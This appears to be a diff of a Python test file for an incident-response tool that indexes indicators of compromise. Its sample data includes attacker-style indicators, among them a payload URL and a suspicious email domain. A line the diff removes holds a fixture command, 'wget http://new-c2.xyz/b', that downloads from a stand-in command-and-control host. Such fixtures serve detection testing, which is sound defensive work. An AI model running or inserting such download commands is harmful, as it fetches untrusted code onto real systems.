@@ -76,18 +76,43 @@ def test_text_iocs_dedupes_hosts_inside_urls():
     assert not any(value == "kernel32.dll" for _, value in found)
 
 
-def test_extract_from_every_tab():
-    items = extract(incident_doc("x", browser=BROWSER, commands=COMMANDS, eventlogs=EVENTLOGS))
-    attacker = items[("ip", "185.220.101.47")]
-    assert attacker["sources"] == {"browser:chrome", "commands:powershell", "eventlog:Security"}
-    assert attacker["first"] == 3000 and attacker["last"] == 6000
-    domain = items[("domain", "cdn-update-service.top")]
-    assert domain["sources"] == {"browser:chrome", "eventlog:Microsoft-Windows-Sysmon/Operational"}
-    assert ("url", "http://185.220.101.47/payload.exe") in items
-    assert ("domain", "www.google.com") in items  # history hosts are indexed; the allowlist hides them
-    assert ("email", "x@evil-mail.ru") in items
-    assert ("sha256", SHA) in items and ("sha256", "c" * 64) in items and ("md5", "b" * 32) in items
-    assert ("ip", "10.0.0.5") in items
+def test_extract_does_not_read_host_evidence_of_the_document():
+    # From 7.0 the document holds none of it (it is moved to the tables when written); a document that
+    # still does gives no indicator from those keys. What a parser declares reaches the index as found.
+    held = incident_doc("x", browser=BROWSER, commands=COMMANDS, eventlogs=EVENTLOGS, endpoint={"categories": {}})
+    items = extract(held)
+    assert items == {}
+    manual = {"iocs": {"manual": [{"type": "ip", "value": "185.220.101.47", "source": "reputation"}]}}
+    items = extract(incident_doc("x", commands=COMMANDS, **manual))
+    assert list(items) == [("ip", "185.220.101.47")] and items[("ip", "185.220.101.47")]["sources"] == {"reputation"}
+
+
+def test_a_found_indicator_of_host_evidence_is_in_the_index(admin: TestClient):
+    from sqlalchemy import select
+
+    from app.core.db import SessionLocal
+    from app.core.models import FoundIndicator, Incident, IocEntry
+    from app.iocs import MAX_PER_INCIDENT, reindex_incident
+
+    key = make_key(admin, roles=["analyst"])
+    assert admin.post("/api/incidents", headers=key, json={"id": "ioc-f", "data": {}}).status_code == 201
+    with SessionLocal() as db:
+        db.add(
+            FoundIndicator(
+                incident_id="ioc-f",
+                type="domain",
+                value="cdn-update-service.top",
+                path="evidence.browser",
+                door="evidence",
+                found_at="2026-11-24T10:00:00Z",
+            )
+        )
+        db.flush()
+        reindex_incident(db, db.get(Incident, "ioc-f"), alerts=False)
+        db.commit()
+        row = db.scalars(select(IocEntry).where(IocEntry.incident_id == "ioc-f")).one()
+    assert (row.type, row.value) == ("domain", "cdn-update-service.top")
+    assert list(row.sources) == ["found:evidence.browser"] and MAX_PER_INCIDENT > 0
 
 
 def test_allowlist():
@@ -99,10 +124,26 @@ def test_allowlist():
     assert allow.matches("sha256", SHA) and allow.matches("ip", "fe80::1")
 
 
+def manual(*values: tuple[str, str]) -> dict:
+    return {"iocs": {"manual": [{"type": kind, "value": value, "source": "reputation"} for kind, value in values]}}
+
+
 def test_index_lookup_shared_and_export(admin: TestClient):
     key = make_key(admin, roles=["analyst"])
-    a = incident_doc("ioc-a", browser=BROWSER, commands=COMMANDS)
-    b = incident_doc("ioc-b", eventlogs=EVENTLOGS)
+    a = incident_doc(
+        "ioc-a",
+        **manual(
+            ("ip", "185.220.101.47"),
+            ("domain", "cdn-update-service.top"),
+            ("domain", "www.google.com"),
+            ("url", "http://185.220.101.47/payload.exe"),
+            ("email", "x@evil-mail.ru"),
+            ("sha256", SHA),
+        ),
+    )
+    b = incident_doc(
+        "ioc-b", **manual(("ip", "185.220.101.47"), ("domain", "cdn-update-service.top"), ("ip", "10.0.0.5"))
+    )
     assert admin.post("/api/incidents", headers=key, json=a).status_code == 201
     assert admin.post("/api/incidents", headers=key, json=b).status_code == 201
 
@@ -128,7 +169,7 @@ def test_index_lookup_shared_and_export(admin: TestClient):
     admin.patch(
         "/api/incidents/ioc-b",
         headers={**key, "Content-Type": "application/merge-patch+json"},
-        json={"data": {"commands": {"shells": {"bash": {"commands": [{"command": "wget http://new-c2.xyz/b"}]}}}}},
+        json={"data": manual(("domain", "new-c2.xyz"))},
     )
     r = admin.get("/api/iocs/lookup", headers=key, params={"type": "domain", "value": "new-c2.xyz"})
     assert [i["id"] for i in r.json()["incidents"]] == ["ioc-b"]
